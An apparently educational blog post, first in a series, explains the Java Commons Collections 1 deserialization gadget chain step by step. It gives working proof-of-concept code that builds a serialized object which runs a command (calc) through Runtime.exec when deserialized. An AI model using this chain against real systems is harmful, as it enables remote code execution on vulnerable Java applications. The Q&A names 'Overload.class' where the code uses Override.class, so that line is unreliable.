---
title: "Java反序列化利用链学习 - CommonCollection1"
date: 2022-03-23T14:21:00+08:00
lastmod: 2022-03-23T14:22:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---

## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java Deserialization Gadget - CommonCollection1

### Request

* JDK 1.7
* commons-collections 3.1

### Gadget Analyzing

Overview of `CommonCollection1` is show below:

```
Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

For learning, we use reverse way to analyze this gadget chain.

#### Transformer Interface

In `org.apache.commons.collections`, a interface `Transformer` declared a method `transform` to modified the passed `Object` and return a new one.

```java
public interface Transformer {

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     *
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class
     * @throws IllegalArgumentException (runtime) if the input is invalid
     * @throws FunctorException (runtime) if the transform cannot be completed
     */
    public Object transform(Object input);

}
```

There are some class implement it in `org.apache.commons.collections`, and three of them are used in `CommonCollection1`.

##### InvokerTransformer

Implement the `transform` to invoke the method of field `iMethodName` with args `iParamTypes` and return the result.

```java
/**
 * Transforms the input to result by invoking a method on the input.
 * 
 * @param input  the input object to transform
 * @return the transformed result, null if null input
 */
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

##### ConstantTransformer

Implement the `transform` to return the field `iConstant`. In other words, it does nothing.

```java
/**
 * Transforms the input by ignoring it and returning the stored constant instead.
 * 
 * @param input  the input object which is ignored
 * @return the stored constant
 */
public Object transform(Object input) {
    return iConstant;
}
```

##### ChainedTransformer

Implement the `transform` to call each `Transformer` in field `iTransformers` and reuse it returned `Object` as the args for next.

```java
/**
 * Transforms the input to result via each decorated transformer
 * 
 * @param object  the input object passed to the first transformer
 * @return the transformed result
 */
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

With there's `Transformer`, we can construt a `ChainedTransformer` to execute arbitrary code.

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
    new ConstantTransformer(Runtime.getRuntime()),
    new InvokerTransformer("exec",
            new Class[]{String.class}, new Object[]{"calc"})
});
chainedTransformer.transform(null);
```

But, if you try to serialize this `chainedTransformer` object, you will get a `Execption`. Because the `Runtime` has no implement the `Serialzable`. So we need to use reflection for building.

Re-construct it as below

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
            new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
            new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
            new Class[]{String.class}, new Object[]{"calc"})
});
chainedTransformer.transform(null);
```

##### LazyMap

Now we need to found a place will call the `transform` method of a `ChainedTransformer` af `readObject`.

CC1 use `org.apache.commons.collections.map.LazyMap#get`

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

So, if we construct a `LazyMap` which the field `factory` was a `ChainedTransformer` object, we can call this `get` method with a no exists `key` to perform the `transform` method.

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
            new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
            new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
            new Class[]{String.class}, new Object[]{"calc"})
});

LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
lazyMap.get(null);
```

##### AnnotationInvocationHandler

Keep going, wherether a `readObject` can we found and control it to call the `get` method of a `LazyMap` object.

In JDK, there is a class `sun.reflect.annotation.AnnotationInvocationHandler`. This class implement `InvocationHandler`, and CC1 use it with dynamic proxy to call a special method.

Let's see the `readObject` of `AnnotationInvocationHandler`

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();

    ...
}
```

In `readObject`, it's call the `entrySet` method of `memberValues`, where `memberValues` was a `Map` and `entrySet` was a method defined in interface `Map`. Look up the `invoke` too

```java
public Object invoke(Object var1, Method var2, Object[] var3) {
    String var4 = var2.getName();
    Class[] var5 = var2.getParameterTypes();
    if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
        return this.equalsImpl(var3[0]);
    } else if (var5.length != 0) {
        throw new AssertionError("Too many parameters for an annotation method");
    } else {
        byte var7 = -1;
        
        ...

        switch(var7) {
        case 0:
            return this.toStringImpl();
        case 1:
            return this.hashCodeImpl();
        case 2:
            return this.type;
        default:
            Object var6 = this.memberValues.get(var4);
            ...
        }
    }
}
```

The `get` method of will be call with `this.memberValues.get(var4)`.

How can we use there's method? Since the `AnnotationInvocationHandler` implement `InvocationHandler`, it's can be use in dynamic proxy. 
In the `readObject` method, if the `memberValues` set the handler as `AnnotationInvocationHandler` with `Proxy.newProxyInstance()`.
When calling the `entrySet` method, the `invoke` of `AnnotationInvocationHandler` will be call, and the `get` method be invoke.

Now we can try to write the code below

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
            new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
            new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
            new Class[]{String.class}, new Object[]{"calc"})
});

LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

Constructor annotationInvocationHandler =
        Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                getDeclaredConstructor(Class.class, Map.class);
annotationInvocationHandler.setAccessible(true);
InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
        newInstance(Override.class, lazyMap);

Map map = (Map) Proxy.
        newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
        newInstance(Override.class, map);
```

How to understand the process when deserialiaztion?

* call `readObject` of `anotherHandler`
    * call `this.memberValues.entrySet()`, where `memberValues` was the proxy object `map`, so
    * call `annoHandler`'s `invoke`
        * call `get` of `lazyMap`
            * call `transform` of `chainedTransformer`

And try to use it

```java
try {
    FileOutputStream ofs = new FileOutputStream(new File("poc.ser"));
    ObjectOutputStream oos = new ObjectOutputStream(ofs);
    oos.writeObject(anotherHandler);

    FileInputStream ifs = new FileInputStream(new File("poc.ser"));
    ObjectInputStream ois = new ObjectInputStream(ifs);
    ois.readObject();
} catch (Exception e) {
    e.printStackTrace();
}
```

### Question

Q: Why the first argument of constrution `AnnotationInvocationHandler` use `Overload.class`?

A: In construtor of `AnnotationInvocationHandler`, it will check wherether the first argument was a `Annotation`

```java
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    Class[] var3 = var1.getInterfaces();
    if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
        this.type = var1;
        this.memberValues = var2;
    } else {
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    }
}
```

## References

1. https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java